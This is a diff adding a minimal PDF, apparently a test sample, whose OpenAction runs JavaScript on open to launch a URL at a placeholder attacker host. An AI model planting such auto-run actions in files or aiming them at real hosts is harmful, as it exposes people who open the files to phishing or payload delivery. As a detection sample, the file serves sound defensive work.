@@ -1,0 +1,8 @@
+%PDF-1.4
+1 0 obj
+<< /Type /Catalog /OpenAction 2 0 R >>
+endobj
+2 0 obj
+<< /S /JavaScript /JS (app.launchURL\(https://attacker.invalid\)) >>
+endobj
+%%EOF
